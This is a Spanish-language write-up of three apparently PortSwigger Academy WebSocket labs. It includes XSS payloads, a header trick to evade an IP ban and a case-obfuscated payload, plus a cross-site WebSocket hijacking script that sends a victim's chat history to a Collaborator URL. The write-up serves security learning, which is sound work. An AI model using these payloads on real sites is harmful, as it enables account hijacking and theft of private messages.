-----
### QUE ES?
Las **WebSocket Vulnerabilities** son fallos de seguridad en aplicaciones que usan el protocolo WebSocket para mantener una comunicación bidireccional en tiempo real entre cliente y servidor.  
Ocurren cuando los mensajes enviados por el cliente no se validan correctamente en el servidor.  
Esto permite que un atacante manipule mensajes WebSocket para ejecutar acciones no autorizadas, acceder a datos de otros usuarios o realizar ataques como **IDOR, XSS o manipulación de acciones**.  
Se previene validando correctamente los mensajes recibidos, implementando controles de autorización en el servidor y filtrando el contenido enviado.
#### PASOS:
- *PROBAR XSS EN LOS MENSAJES DE WEBSOCKET*
- *ENVIAR LOS MENSAJES MODIFICADOS DESDE BURP*
- *INTENTAR VER EL CHAT DE OTRO USUARIO*
- *USAR CABECERAS PARA EVADIR BLOQUEOS*
- *OFUSCAR PAYLOADS*
### LAB1: MANIPULATING WEBSOCKET MESSGES TO EXPLOIT VULNERABILITIES
En este laboratorio encontramos un *Live Chat* que parece estar siendo revisado por alguien, observamos que la comunicación es a través de *websocket*.
Como está siendo revisado por alguien podemos tratar de realizar un **XSS** en el navegador, pero vemos a través del *Websocket History* que al enviar `</>` los escapa,
para poder llevarlo a cabo podemos interceptar el mensaje con *Burp* y enviarlo desde ahi por si la validación es en cliente.
`<img src=1 onerror=alert(0)>`
### LAB2: CROSS-SITE WEBSOCKET HIJACKING
En este laboratorio volvemos a ver un *Live Chat*, si enviamos algunos mensajes y observamos el *Websocket History* vemos que el comando **READY** muestra todos los mensajes del chat y que en la request en la que se realiza el *HandShake* entre cliente y servidor no se usa ningún tipo de *CSRF token*.
Podemos crear un script malicioso en el *exploit server* que a través de *burp collaborator* nos muestre todo el historial del chat de la víctima.
En el *exploit server*:
`<script>
`    var ws = new WebSocket('wss://LAB-ID.web-security-academy.net/chat');
`    ws.onopen = function() {
`        ws.send("READY");
`    };
`    ws.onmessage = function(event) {
`        fetch('https://COLLABORATOR-URL', {method: 'POST', mode: 'no-cors', body: event.data});
`    };
`</script>
De esta forma se lo enviamos a la víctima y hacemos Poll en Collaborator.
### LAB3: MANIPULATING THE WEBSOCKET HANDSHAKE TO EXPLOIT VULNERABILITIES
En este lab también nos encontramos con un *Live Chat* que parece estar revisado por otra persona, si intentamos un *XSS* vemos que nos banea la ip, pero si introducimos la cabecera `X-Forwarded-For: 1.1.1.1` nos permite iniciar un nuevo chat. Para realizar el *XSS* podemos intentar ofuscarlo enviando esto desde *Burp*:
`<img src=1 oNeRrOr=alert`1`>`
